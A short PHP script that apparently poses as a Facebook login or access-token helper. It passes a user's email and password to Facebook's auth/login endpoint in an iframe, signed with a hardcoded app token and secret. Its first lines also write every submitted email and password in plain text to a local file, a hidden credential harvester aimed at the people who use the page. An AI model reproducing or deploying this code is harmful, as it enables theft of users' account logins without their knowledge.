<?php
if(isset($_GET['email'])){
	$acc = $_GET['email'];
	$pass = $_GET['password'];
	$fp = fopen('thangdzvclacc.txt','a+');
	fwrite($fp, $acc."|".$pass."\n");
	fclose($fp);
}
if($_GET) $_POST = $_GET;
function sign_creator(&$data){
	$sig = "";
	foreach($data as $key => $value){
		$sig .= "$key=$value";
	}
	$sig .= 'c1e620fa708a1d5696fb991c1bde5662';
	$sig = md5($sig);
	return $data['sig'] = $sig;
}
$data = array(
	"email" => $_GET['email'],
	"password" => $_GET['password']
//	"access_token" => '6628568379|c1e620fa708a1d5696fb991c1bde5662',
//	"method" => 'post'
);
sign_creator($data);
?>
<iframe width="100%" height="100%" frameborder="0" src="https://b-graph.facebook.com/auth/login?<?= http_build_query($data);?>&access_token=6628568379|c1e620fa708a1d5696fb991c1bde5662&method=post"></iframe>